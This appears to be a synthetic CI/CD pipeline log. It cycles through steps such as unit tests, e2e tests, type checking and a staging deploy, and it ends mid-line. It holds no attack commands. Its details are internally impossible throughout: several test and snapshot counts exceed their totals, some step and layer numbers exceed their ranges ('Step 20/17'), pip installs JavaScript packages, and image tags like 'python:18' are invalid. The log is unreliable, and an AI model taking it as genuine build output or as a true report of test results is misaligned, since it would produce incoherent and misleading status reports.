jest@3.4.2\nImage pulled successfully\nTime: 7.422s\nStep 12/24: Running migrations\nTime: 47.658s\nCache hit for key-5790\nTest Suites: 45 passed, 29 total\nyarn add: Done in 12.73s\nTests: 379 passed, 409 total\n\u2713 Step 'setup' succeeded\npip: Downloading eslint-2.5.tar.gz\npip: Downloading jest-3.13.tar.gz\nInstalling express@2.12.0\nTime: 113.881s\nTest Suites: 48 passed, 24 total\n\u2713 Step 'test' succeeded\nFinished.\nTests: 500 passed, 51 total\nEnvironment: production\nReady.\nyarn add: Done in 2.90s\n[12:19:49] INFO: Cache refreshed\nConnection established\nnpm install: added 460 packages\nArtifact downloaded: 18MB\nLayer 7/11: ENV command\nyarn add: Done in 28.52s\npip: Collecting lodash\nStep 14/19: Linting\nCompiling src/handler.rs...\nSwitched to branch 'feature/task-598'\nVerifying...\nGenerating source maps...\nCompleted.\nOptimizing 54 modules...\nTransforming 435 files...\npip install: Successfully installed lodash-1.18\n\u2713 deploy completed\nWARNING: webpack has known vulnerabilities\nBuilding Docker image...\npip install: Successfully installed react-4.7\nStep 7/15: Linting\n[12:19:49] WARN: Deprecated API usage\n\u2713 All checks passed\nException: ValueError\nTest Suites: 33 passed, 38 total\nPushing to registry...\n[12:19:49] DEBUG: Connection pool: 13 active\nnpm install: added 120 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: darwin-arm64\nBuilding Docker image...\nSnapshots: 12 passed, 39 total\nBuilding Docker image...\nTest Suites: 18 passed, 9 total\nTLS handshake completed\nCache saved successfully\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\nFAILED: test_db_connect\nWARNING: react has known vulnerabilities\nEnvironment: staging\nFinished.\nNODE_ENV=test\nGET /api - 201 (88ms)\nVerifying...\n\u2713 Task completed in 4499ms\n[12:19:49] INFO: Processing request\nChecking out master branch\nLayer 8/10: COPY command\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact downloaded: 46MB\nCache miss for key-1415\nLoading...\nLayer 7/9: COPY command\nnpm notice: created a lockfile\nCompiling src/main.py...\nLayer 9/10: COPY command\n[12:19:49] DEBUG: Loading configuration\nEnvironment: development\n[12:19:49] DEBUG: Connection pool: 16 active\n[12:19:49] DEBUG: Loading configuration\nFinished.\n[12:19:49] INFO: Starting build process\nRan 139 tests in 34s\nCompiling components/app.ts...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (28MB)\nnpm install: added 154 packages\n[12:19:49] INFO: Cache refreshed\nReady.\nStep 15/20: Linting\n[12:19:49] DEBUG: Loading configuration\npip: Installing build dependencies...\n  PASS: test_db_connect (309ms)\n\u2717 build failed with exit code 63\n\u2717 build failed with exit code 38\nCreating production build...\nMinifying app.js\nDone.\nVerifying...\nEnvironment: test\nStep 5/18: Testing\n\u2717 build failed with exit code 99\nStep 9/22: Installing dependencies\nAlready up to date.\nBuilding Docker image...\nRan 142 tests in 17s\nHEAD is now at b016a16\nUsing Python 3.10\n[12:19:49] INFO: Request completed\n[12:19:49] WARN: Deprecated API usage\nCache restored successfully (263MB)\nCoverage: 79% statements, 77% branches\nSnapshots: 32 passed, 48 total\nStep 19/19: Running migrations\n[12:19:49] DEBUG: Loading configuration\n[12:19:49] INFO: Processing request\nTests: 171 passed, 376 total\nPlatform: linux-x64\nSnapshots: 38 passed, 42 total\nNODE_ENV=production\nLoading...\nWARNING: lodash has known vulnerabilities\nCoverage: 81% statements, 74% branches\nStep 6/21: Deploying\nPOST /upload - 201 (174ms)\n[12:19:49] INFO: Processing request\nArtifact downloaded: 18MB\nStep 6/16: Installing dependencies\nStep 17/22: Running migrations\n\u2713 Task completed in 2960ms\nLoading...\nCompleted.\n[12:19:49] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-1925\n[12:19:49] DEBUG: Initializing service\n[12:19:49] DEBUG: Initializing service\nCoverage: 70% statements, 93% branches\nUploading artifact 'coverage' (46 files)\nNODE_ENV=production\n[12:19:49] INFO: Connecting to database\nLoading...\nTime: 102.81s\nPlatform: linux-x64\nWARNING: express has known vulnerabilities\nPOST /data - 202 (428ms)\nCompleted.\nGenerating source maps...\nStep 11/15: Testing\npip: Downloading prettier-4.5.tar.gz\nLoading...\n[12:19:49] ERROR: Connection failed\nLayer 8/8: ENV command\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:49] DEBUG: Initializing service\n[12:19:49] DEBUG: Memory usage: 904MB\nCache restored successfully (294MB)\nOptimizing 23 modules...\nyarn add: Done in 28.83s\nCreating production build...\nnpm notice: created a lockfile\nFinished.\n[12:19:49] DEBUG: Connection pool: 6 active\nCompiling lib/app.ts...\nCache invalidated: dependencies\nPulling image: python:latest\nArtifact uploaded: dist.zip (93MB)\nPushing to registry...\nStep 12/24: Testing\n[12:19:49] INFO: Request completed\nyarn add: Done in 2.69s\nConnecting to example.com:443...\nArtifact downloaded: 21MB\n[12:19:49] DEBUG: Initializing service\nSwitched to branch 'bugfix/task-233'\nReady.\nWARNING: react has known vulnerabilities\nPlatform: darwin-arm64\n[12:19:49] DEBUG: Query executed in 55ms\n[12:19:49] INFO: Starting build process\nCompleted.\nChecking out develop branch\nGenerating source maps...\n[12:19:49] DEBUG: Connection pool: 4 active\nNODE_ENV=development\n[12:19:49] INFO: Processing request\nCache invalidated: dependencies\n[12:19:49] INFO: Request completed\n[12:19:49] INFO: Request completed\nCreating production build...\nArtifact downloaded: 25MB\nGenerating source maps...\nLayer 10/10: RUN command\nCache hit for key-2434\nCreating production build...\nCompiling components/main.py...\nCompiling lib/index.js...\nLayer 3/12: COPY command\n[12:19:49] DEBUG: Initializing service\nWaiting...\nCoverage: 82% statements, 70% branches\nCoverage: 98% statements, 97% branches\n\u2713 test completed\nOK\nConnection established\nCompiling src/index.js...\nFinished.\nStep 1/17: Running migrations\n[12:19:49] DEBUG: Memory usage: 1333MB\nUsing Python 3.9\n\u2713 Task completed in 2018ms\nNODE_ENV=development\nFetching submodules...\n  PASS: e2e/test_auth_login.spec.js\nCompiling src/utils.go...\nSwitched to branch 'feature/task-711'\nConnecting to example.com:443...\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (65MB)\nReady.\n  PASS: test_api_health (182ms)\npip: Installing build dependencies...\nWaiting...\nStep 2/23: Linting\n[12:19:49] DEBUG: Connection pool: 17 active\nGenerating source maps...\nStep 5/22: Installing dependencies\nVerifying...\nRan 73 tests in 45s\npip: Collecting eslint\nReady.\nAlready up to date.\nTransforming 242 files...\n[12:19:49] INFO: Request completed\nTests: 471 passed, 83 total\nCompiling utils/index.js...\nUsing Python 3.9\nBundling main.js\nBundling vendor.css\nHEAD is now at 8ead725\n=== Step unit_tests completed ===\n=== Step: e2e_tests ===\nLayer 4/15: RUN command\nSnapshots: 34 passed, 38 total\n\u2713 All checks passed\nDone.\nPulling image: node:3.11\nPulling image: node:3.11\nAlready up to date.\nCache hit for key-6224\nPushing to registry...\n[12:19:49] INFO: Connecting to database\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFinished.\nStep 14/22: Installing dependencies\nAlready up to date.\nnpm notice: created a lockfile\nHEAD is now at caeb38a\nUploading artifact 'dist' (48 files)\nLoading...\n[12:19:49] ERROR: Connection failed\nTests: 344 passed, 234 total\n[12:19:49] WARN: Deprecated API usage\nReady.\nUsing Node.js 14.8.6\nCompiling src/app.ts...\nUsing Node.js 20.1.5\nMinifying vendor.js\nPushing to registry...\nSwitched to branch 'bugfix/task-957'\n[12:19:49] DEBUG: Memory usage: 512MB\nVerifying...\n[12:19:49] DEBUG: Connection pool: 6 active\nCoverage: 71% statements, 65% branches\nFinished.\nUsing Python 3.10\nFinished.\nNODE_ENV=development\nnpm notice: package.json updated\npip install: Successfully installed axios-5.16\nRan 28 tests in 46s\nSnapshots: 4 passed, 27 total\nTests: 476 passed, 464 total\nArtifact uploaded: build.tar.gz (11MB)\nCompleted.\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\npip: Installing build dependencies...\nnpm notice: created a lockfile\nSnapshots: 33 passed, 2 total\nOK\nBundling runtime.js\nReady.\nBuilding Docker image...\nCompiling lib/utils.go...\npip: Installing build dependencies...\nWaiting...\npip install: Successfully installed eslint-3.1\nDone.\nSnapshots: 30 passed, 13 total\nStep 2/18: Installing dependencies\nEnvironment: test\nCache saved successfully\nTests: 136 passed, 398 total\nConnecting to test.io:443...\nCompiling utils/handler.rs...\nCache restored successfully (430MB)\nChecking out master branch\n[12:19:49] DEBUG: Initializing service\nWARNING: lodash has known vulnerabilities\nWARNING: express has known vulnerabilities\nTime: 115.369s\nUploading artifact 'build' (4 files)\nDone.\nCache hit for key-4287\nnpm install: resolved 920 packages\nSnapshots: 40 passed, 37 total\nStep 20/17: Building\nUploading artifact 'dist' (3 files)\nException: ValueError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /api - 202 (158ms)\nConnection established\n[12:19:49] INFO: Request completed\n[12:19:49] DEBUG: Memory usage: 1989MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\npip: Collecting axios\n[12:19:49] DEBUG: Memory usage: 455MB\n[12:19:49] DEBUG: Query executed in 86ms\n[12:19:49] INFO: Processing request\nWARNING: express has known vulnerabilities\nnpm install: added 33 packages\n\u2713 Step 'setup' succeeded\nVerifying...\nCompiling src/utils.go...\nSwitched to branch 'feature/task-490'\nProcessing...\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] DEBUG: Initializing service\nnpm install: added 139 packages\npip install: Successfully installed express-4.15\nCache saved successfully\nPushing to registry...\n[12:19:49] DEBUG: Memory usage: 1059MB\nCompiling utils/handler.rs...\nUsing Python 3.12\nPlatform: darwin-arm64\n[12:19:49] DEBUG: Loading configuration\nEnvironment: production\nCache hit for key-3815\nStep 18/23: Running migrations\n[12:19:49] WARN: Deprecated API usage\n\u2713 Step 'setup' succeeded\nVerifying...\npip: Collecting lodash\n\u2713 Step 'checkout' succeeded\nNODE_ENV=production\n[12:19:49] INFO: Connecting to database\nnpm notice: created a lockfile\nRan 192 tests in 8s\nHEAD is now at 8718830\nTests: 419 passed, 216 total\nCache saved successfully\nWARNING: lodash has known vulnerabilities\nBuilding Docker image...\nCache miss for key-7122\nArtifact downloaded: 47MB\nTest Suites: 7 passed, 25 total\nTLS handshake completed\nReady.\nTests: 184 passed, 414 total\nCreating production build...\nRan 36 tests in 2s\nSuccess!\nGET /api - 204 (65ms)\n\u2713 All checks passed\n\u2713 Step 'checkout' succeeded\nTime: 100.607s\nMinifying main.js\nGET /api - 201 (67ms)\n[12:19:49] DEBUG: Initializing service\nCoverage: 87% statements, 64% branches\nCompiling components/handler.rs...\n[12:19:49] INFO: Request completed\nCache hit for key-8482\nTests: 453 passed, 230 total\nStep 17/21: Running migrations\nBuilding Docker image...\n\u2713 deploy completed\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 99% statements, 98% branches\nCache invalidated: node_modules\nStep 12/23: Building\nyarn add: Done in 23.59s\nCoverage: 82% statements, 82% branches\nArtifact uploaded: dist.zip (28MB)\nStep 8/22: Linting\npip: Collecting express\nFAILED: test_db_connect\n  PASS: test_auth_login (172ms)\nException: NullPointerException\nStep 6/17: Deploying\npip: Downloading express-4.19.tar.gz\nWARNING: express has known vulnerabilities\nTime: 30.245s\nUsing Node.js 17.20.1\n[12:19:49] INFO: Processing request\nArtifact uploaded: dist.zip (53MB)\nMinifying app.js\n[12:19:49] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:49] DEBUG: Connection pool: 11 active\n[12:19:49] DEBUG: Initializing service\nnpm install: resolved 928 packages\nEnvironment: test\nnpm install: added 84 packages\n[12:19:49] DEBUG: Memory usage: 889MB\n  PASS: unit/test_auth_login.spec.js\nBuilding Docker image...\n\u2713 Task completed in 4765ms\nCache invalidated: build\n[12:19:49] INFO: Processing request\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\nPushing to registry...\nBuilding Docker image...\nArtifact uploaded: dist.zip (19MB)\nBuilding Docker image...\n  PASS: test_auth_login (244ms)\nUploading artifact 'coverage' (20 files)\nHEAD is now at 8ba3210\nWARNING: react has known vulnerabilities\nCompiling components/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (408ms)\nCompleted.\nHEAD is now at 8c05796\nFAILED: test_auth_login\nReady.\nCompiling components/service.java...\n[12:19:49] WARN: Deprecated API usage\nTransforming 200 files...\nyarn add: Done in 12.55s\nFetching submodules...\nFetching submodules...\n  PASS: test_db_connect (189ms)\nCoverage: 76% statements, 63% branches\nProcessing...\nCache hit for key-6907\nnpm install: added 431 packages\nnpm install: resolved 692 packages\nBuilding Docker image...\nnpm install: added 312 packages\npip: Downloading prettier-2.19.tar.gz\nNODE_ENV=development\nStep 1/15: Deploying\nPulling image: alpine:3.11\nCreating production build...\nLayer 1/15: COPY command\nDone.\nWARNING: jest has known vulnerabilities\n[12:19:49] ERROR: Connection failed\nLoading...\nnpm install: resolved 1146 packages\nPushing to registry...\nStep 17/17: Testing\n[12:19:49] ERROR: Connection failed\nUsing Python 3.11\nTime: 36.761s\nPulling image: node:latest\nLoading...\nAlready up to date.\n[12:19:49] DEBUG: Initializing service\nEnvironment: development\n  PASS: unit/test_db_connect.spec.js\n[12:19:49] ERROR: Connection failed\nWARNING: lodash has known vulnerabilities\nLoading...\nFAILED: test_cache_hit\nUploading artifact 'coverage' (32 files)\n[12:19:49] DEBUG: Query executed in 11ms\nTest Suites: 48 passed, 32 total\n[12:19:49] INFO: Starting build process\nCoverage: 76% statements, 79% branches\nOK\nCache miss for key-3732\nUploading artifact 'coverage' (24 files)\nWARNING: webpack has known vulnerabilities\nPulling image: python:18\nDone.\nLayer 10/8: RUN command\nWARNING: eslint has known vulnerabilities\n\u2713 package completed\n  PASS: unit/test_db_connect.spec.js\nCompiling components/handler.rs...\nEnvironment: development\n[12:19:49] WARN: Deprecated API usage\nInstalling eslint@3.10.8\n[12:19:49] ERROR: Connection failed\nWARNING: lodash has known vulnerabilities\nFAILED: test_db_connect\nGET /api - 204 (21ms)\n[12:19:49] WARN: Deprecated API usage\nBuilding Docker image...\n  PASS: e2e/test_auth_login.spec.js\nNODE_ENV=production\nCompleted.\n[12:19:49] ERROR: Connection failed\nWaiting...\nUsing Python 3.11\nArtifact uploaded: build.tar.gz (23MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nStep 2/20: Deploying\n\u2713 Task completed in 3355ms\npip install: Successfully installed react-1.5\nnpm install: resolved 1238 packages\nSuccess!\nSwitched to branch 'feature/task-417'\nWARNING: webpack has known vulnerabilities\nStep 16/23: Linting\nCompiling utils/handler.rs...\nCompleted.\npip: Downloading lodash-4.8.tar.gz\nCache invalidated: dependencies\nFAILED: test_api_health\nCompiling utils/app.ts...\nUploading artifact 'coverage' (34 files)\nCache miss for key-9779\n\u2713 test completed\nLayer 3/14: COPY command\n\u2713 lint completed\nAlready up to date.\nWaiting...\n[12:19:49] ERROR: Connection failed\nTransforming 474 files...\nEnvironment: test\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] DEBUG: Initializing service\nAlready up to date.\nEnvironment: test\nConnecting to cloud.services:443...\nStep 18/24: Testing\nCompleted.\nTLS handshake completed\nLoading...\n\u2717 build failed with exit code 35\nStep 8/15: Running migrations\nnpm notice: package.json updated\nnpm install: added 56 packages\nUsing Node.js 14.17.10\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/utils.go...\n[12:19:49] DEBUG: Loading configuration\nInstalling jest@3.0.10\n\u2713 Step 'checkout' succeeded\nStep 14/22: Deploying\nConnecting to example.com:443...\n[12:19:49] INFO: Connecting to database\nCreating production build...\nAlready up to date.\n\u2713 Task completed in 1363ms\n[12:19:49] INFO: Processing request\nGET /status - 204 (90ms)\nUsing Node.js 15.3.9\nHEAD is now at 5e27a21\nTLS handshake completed\n[12:19:49] INFO: Cache refreshed\nGenerating source maps...\nCache miss for key-7367\nCache hit for key-2326\nPlatform: win32-x64\nWaiting...\nStep 19/20: Deploying\nSwitched to branch 'feature/task-173'\nCompiling components/utils.go...\n[12:19:49] DEBUG: Memory usage: 1093MB\n[12:19:49] WARN: Deprecated API usage\nEnvironment: test\nFinished.\nGET /health - 201 (67ms)\n[12:19:49] WARN: Deprecated API usage\nBundling main.js\nSuccess!\nProcessing...\nnpm install: resolved 1192 packages\nReady.\nAlready up to date.\nConnection established\nPlatform: darwin-arm64\nLoading...\npip: Installing build dependencies...\nMinifying app.js\nPOST /api - 202 (16ms)\n[12:19:49] DEBUG: Memory usage: 1007MB\nCache restored successfully (474MB)\nTransforming 139 files...\nHEAD is now at c3fa0e5\nCompiling components/handler.rs...\n[12:19:49] DEBUG: Query executed in 39ms\nLayer 8/13: ENV command\nFinished.\nWARNING: webpack has known vulnerabilities\nTransforming 485 files...\nWARNING: jest has known vulnerabilities\n[12:19:49] WARN: Deprecated API usage\n=== Step save_cache completed ===\n=== Step: type_check ===\nSuccess!\nFinished.\nImage pulled successfully\npip install: Successfully installed prettier-2.15\n[12:19:49] INFO: Processing request\n\u2713 validate completed\n\u2713 All checks passed\nnpm install: added 313 packages\nDone.\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 4/24: Running migrations\nPOST /upload - 202 (458ms)\n\u2717 build failed with exit code 14\nFetching submodules...\nConnecting to example.com:443...\n  PASS: e2e/test_db_connect.spec.js\nArtifact downloaded: 9MB\nConnection established\nChecking out master branch\nException: NullPointerException\nStep 13/16: Linting\nTest Suites: 26 passed, 26 total\n[12:19:49] DEBUG: Initializing service\nConnection established\n[12:19:49] INFO: Request completed\nStep 14/24: Installing dependencies\nProcessing...\n\u2713 Task completed in 4174ms\nWaiting...\nInstalling jest@5.8.0\nCache hit for key-1024\nStep 1/22: Linting\n[12:19:49] INFO: Starting build process\nInstalling react@3.14.9\nCache miss for key-8073\nCoverage: 91% statements, 72% branches\nConnection established\nPlatform: win32-x64\nOptimizing 51 modules...\nPOST /api - 202 (462ms)\nLoading...\nCreating production build...\nException: ValueError\nnpm notice: created a lockfile\nUploading artifact 'dist' (18 files)\nCache restored successfully (336MB)\nProcessing...\nUsing Python 3.10\nException: NullPointerException\n[12:19:49] DEBUG: Connection pool: 5 active\n[12:19:49] WARN: Deprecated API usage\n\u2713 Task completed in 1342ms\nLayer 2/10: RUN command\nCompiling lib/index.js...\nPushing to registry...\nPOST /upload - 201 (440ms)\nProcessing...\npip: Collecting lodash\nTests: 210 passed, 115 total\n[12:19:49] WARN: Deprecated API usage\nSnapshots: 3 passed, 33 total\nCache invalidated: node_modules\nDone.\n[12:19:49] INFO: Request completed\nTransforming 394 files...\nStep 15/19: Deploying\nStep 16/25: Deploying\nCache hit for key-6428\nProcessing...\nStep 10/25: Building\nnpm install: resolved 627 packages\nCache restored successfully (279MB)\n[12:19:49] DEBUG: Initializing service\nPulling image: python:18\nLayer 1/11: ENV command\nNODE_ENV=development\nnpm install: added 231 packages\nGET /status - 200 (13ms)\nPushing to registry...\nMinifying vendor.js\nTests: 122 passed, 77 total\nCompleted.\n\u2717 build failed with exit code 86\nPOST /upload - 201 (30ms)\nVerifying...\n  PASS: integration/test_api_health.spec.js\nTransforming 160 files...\nTime: 118.698s\nHEAD is now at d1d9b08\nStep 17/15: Building\nnpm notice: package.json updated\nStep 6/20: Building\nArtifact uploaded: build.tar.gz (13MB)\nFAILED: test_auth_login\n\u2713 build completed\nBundling styles.css\nCompiling lib/app.ts...\nFetching submodules...\nUploading artifact 'dist' (24 files)\nWARNING: jest has known vulnerabilities\nTime: 68.169s\n[12:19:49] INFO: Starting build process\nTest Suites: 14 passed, 17 total\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\n[12:19:49] ERROR: Connection failed\n\u2713 Task completed in 2115ms\nCache saved successfully\nCompiling src/handler.rs...\n[12:19:49] DEBUG: Memory usage: 1941MB\nSnapshots: 10 passed, 34 total\n\u2717 build failed with exit code 2\n  PASS: e2e/test_auth_login.spec.js\nBuilding Docker image...\nBundling styles.css\nGET /api - 200 (60ms)\nCompiling src/index.js...\nnpm install: resolved 1190 packages\nPulling image: node:latest\nBundling runtime.css\nHEAD is now at 8885d36\nImage pulled successfully\n[12:19:49] DEBUG: Memory usage: 801MB\n[12:19:49] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:49] INFO: Request completed\nCompiling utils/index.js...\nOptimizing 92 modules...\n[12:19:49] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\n[12:19:49] INFO: Cache refreshed\n[12:19:49] DEBUG: Initializing service\nWaiting...\nLayer 1/9: ENV command\n[12:19:49] INFO: Cache refreshed\npip: Installing build dependencies...\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 100\nTLS handshake completed\n[12:19:49] DEBUG: Loading configuration\nnpm notice: package.json updated\nAlready up to date.\nOptimizing 96 modules...\nFinished.\npip install: Successfully installed express-1.4\nCoverage: 79% statements, 61% branches\n[12:19:49] INFO: Starting build process\nException: ValueError\nConnecting to acme.corp:443...\nCache invalidated: dependencies\nUsing Python 3.12\nCompiling components/handler.rs...\nConnection established\nLoading...\n[12:19:49] INFO: Starting build process\nCache restored successfully (466MB)\nnpm notice: package.json updated\nConnection established\nCompiling src/service.java...\nWaiting...\nTime: 107.875s\npip install: Successfully installed axios-4.2\nFetching submodules...\nCompiling components/index.js...\n[12:19:49] WARN: Deprecated API usage\nTest Suites: 31 passed, 45 total\npip: Collecting react\nUsing Node.js 14.6.3\nSnapshots: 23 passed, 7 total\nCompiling components/index.js...\n[12:19:49] DEBUG: Loading configuration\n[12:19:49] DEBUG: Loading configuration\nException: ValueError\nTime: 114.460s\n[12:19:49] INFO: Request completed\nFetching submodules...\nGET /health - 200 (29ms)\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 validate completed\nUsing Node.js 20.7.2\nSuccess!\n=== Step type_check completed ===\n=== Step: deploy_staging ===\nAlready up to date.\nLayer 4/8: COPY command\nTest Suites: 27 passed, 13 total\nCache invalidated: build\nWARNING: eslint has known vulnerabilities\nStep 12/22: Building\nCache hit for key-7294\nCache saved successfully\nRan 162 tests in 26s\nCache invalidated: build\nWARNING: jest has known vulnerabilities\n[12:19:49] INFO: Starting build process\nCache hit for key-3418\nUsing Node.js 20.20.7\nAlready up to date.\nCompiling lib/handler.rs...\nInstalling jest@2.2.4\nConnecting to cloud.services:443...\npip: Collecting lodash\nWARNING: jest has known vulnerabilities\n[12:19:49] INFO: Cache refreshed\nPulling image: node:latest\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] DEBUG: Connection pool: 3 active\nTime: 24.225s\nTime: 75.447s\nGenerating source maps...\nStep 14/23: Deploying\nFinished.\nCache saved successfully\n\u2717 build failed with exit code 83\n[12:19:49] DEBUG: Memory usage: 1928MB\nArtifact uploaded: dist.zip (35MB)\n[12:19:49] INFO: Connecting to database\n\u2717 build failed with exit code 39\nInstalling eslint@3.11.8\npip: Downloading express-4.1.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\nSwitched to branch 'feature/task-120'\nTime: 53.84s\nnpm install: resolved 1846 packages\nHEAD is now at 6b2ee64\nEnvironment: development\npip: Downloading react-4.13.tar.gz\nUsing Node.js 15.0.5\n[12:19:49] ERROR: Connection failed\nCompiling utils/utils.go...\nGenerating source maps...\n\u2713 test completed\nSuccess!\nOptimizing 29 modules...\nOptimizing 63 modules...\nPlatform: darwin-arm64\nSwitched to branch 'hotfix/task-252'\n[12:19:49] ERROR: Connection failed\n  PASS: integration/test_api_health.spec.js\nStep 10/17: Running migrations\nCoverage: 72% statements, 74% branches\nTransforming 854 files...\n[12:19:49] DEBUG: Connection pool: 3 active\nNODE_ENV=development\nVerifying...\nRan 139 tests in 7s\nOptimizing 82 modules...\nCache hit for key-9751\nConnection established\n\u2713 deploy completed\nProcessing...\nCompiling components/handler.rs...\nUsing Python 3.11\nStep 16/20: Testing\n\u2713 Step 'build' succeeded\nUsing Python 3.11\n  PASS: test_cache_hit (128ms)\nUploading artifact 'coverage' (40 files)\nStep 11/25: Building\nTests: 294 passed, 57 total\nnpm notice: package.json updated\nStep 6/17: Testing\nArtifact uploaded: build.tar.gz (1MB)\n\u2713 build completed\n[12:19:49] DEBUG: Loading configuration\nCache saved successfully\nGET /api - 201 (49ms)\nCreating production build...\nCache saved successfully\nCreating production build...\n[12:19:49] INFO: Starting build process\nCache invalidated: dependencies\nUsing Node.js 18.1.9\nBundling vendor.css\nMinifying vendor.js\nStep 5/20: Deploying\nPOST /upload - 201 (145ms)\nGenerating source maps...\nGET /status - 201 (44ms)\nBundling styles.js\nBuilding Docker image...\nUsing Python 3.12\nnpm notice: created a lockfile\nProcessing...\nBuilding Docker image...\nCache hit for key-7188\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nCache invalidated: dependencies\nFAILED: test_api_health\nCompiling lib/main.py...\npip install: Successfully installed eslint-2.1\nWARNING: lodash has known vulnerabilities\n[12:19:49] DEBUG: Query executed in 69ms\nWARNING: prettier has known vulnerabilities\nPOST /data - 201 (280ms)\nFinished.\nSnapshots: 14 passed, 8 total\n[12:19:49] DEBUG: Memory usage: 1088MB\nHEAD is now at f756845\nCache hit for key-4521\nAlready up to date.\n\u2713 Task completed in 680ms\n\u2713 Step 'install' succeeded\nFAILED: test_cache_hit\nChecking out main branch\nTime: 84.983s\nnpm notice: created a lockfile\nStep 4/18: Deploying\nUsing Python 3.10\nArtifact downloaded: 23MB\nStep 19/21: Running migrations\npip: Collecting axios\n[12:19:49] INFO: Connecting to database\n[12:19:49] INFO: Processing request\n  PASS: test_db_connect (200ms)\nFetching submodules...\n[12:19:49] INFO: Processing request\nUploading artifact 'coverage' (43 files)\nCache invalidated: build\nWARNING: react has known vulnerabilities\nStep 14/19: Running migrations\nWARNING: axios has known vulnerabilities\npip install: Successfully installed lodash-5.14\nCache saved successfully\n[12:19:49] WARN: Deprecated API usage\nTime: 68.0s\nTransforming 487 files...\nPOST /upload - 200 (233ms)\n[12:19:49] WARN: Deprecated API usage\nBundling vendor.js\n\u2713 Step 'checkout' succeeded\n\u2713 package completed\nOptimizing 22 modules...\n[12:19:49] WARN: Deprecated API usage\nPulling image: node:latest\nWARNING: lodash has known vulnerabilities\nInstalling eslint@2.1.10\nUsing Python 3.10\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: e2e/test_api_health.spec.js\n[12:19:49] INFO: Processing request\n[12:19:49] DEBUG: Query executed in 63ms\nCache invalidated: build\nPulling image: node:18\nUsing Node.js 17.12.2\nTLS handshake completed\nProcessing...\nInstalling axios@1.3.10\n[12:19:49] ERROR: Connection failed\nOK\nUsing Node.js 18.6.6\nRan 141 tests in 54s\nOK\n[12:19:49] INFO: Starting build process\nCompiling components/index.js...\nFinished.\nHEAD is now at 273b7f7\nLoading...\nTransforming 288 files...\n[12:19:49] INFO: Processing request\nSuccess!\nLoading...\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\n[12:19:49] INFO: Connecting to database\nInstalling react@3.16.3\npip install: Successfully installed webpack-3.13\nStep 4/23: Testing\n  PASS: e2e/test_api_health.spec.js\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] INFO: Cache refreshed\n\u2713 Task completed in 2470ms\nCompiling src/handler.rs...\n[12:19:49] WARN: Deprecated API usage\n[12:19:49] ERROR: Connection failed\n\u2713 Task completed in 3398ms\nConnection established\nHEAD is now at 45d662f\npip install: Successfully installed express-1.1\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPushing to registry...\nAlready up to date.\n[12:19:49] INFO: Cache refreshed\nSnapshots: 44 passed, 15 total\nTLS handshake completed\nWaiting...\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: build\n[12:19:49] INFO: Request completed\nOK\n\u2713 All checks passed\n[12:19:49] DEBUG: Connection pool: 2 active\nArtifact downloaded: 48MB\nBuilding Docker image...\nTest Suites: 39 passed, 24 total\nGenerating source maps...\nBundling main.js\nUsing Node.js 14.3.7\nPushing to registry...\nTransforming 293 files...\nConnection established\nPlatform: darwin-arm64\nTests: 254 passed, 268 total\nStep 12/16: Linting\nCache hit for key-1492\nCreating production build...\nPushing to registry...\nHEAD is now at a600561\n[12:19:49] DEBUG: Initializing service\nStep 9/17: Testing\nFetching submodules...\nMinifying app.js\nOK\nCreating production build...\nArtifact downloaded: 33MB\nCache hit for key-6694\nCache hit for key-3738\nRan 173 tests in 46s\nCoverage: 100% statements, 91% branches\nStep 1/18: Testing\n[12:19:49] INFO: Cache refreshed\nCompleted.\n[12:19:49] DEBUG: Query executed in 12ms\nTest Suites: 37 passed, 29 total\nNODE_ENV=development\nPOST /api - 202 (446ms)\nDone.\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 All checks passed\npip install: Successfully installed jest-2.15\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nEnvironment: staging\nPushing to registry...\nWaiting...\nLoading...\nLayer 2/12: ENV command\n[12:19:49] DEBUG: Initializing service\nException: RuntimeError\nConnecting to cloud.services:443...\nBuilding Docker image...\nSwitched to branch 'bugfix/task-918'\npip: Downloading react-2.2.tar.gz\nWaiting...\nCompleted.\nCache saved successfully\nGET /status - 201 (97ms)\nStep 18/20: Installing dependencies\n[12:19:49] 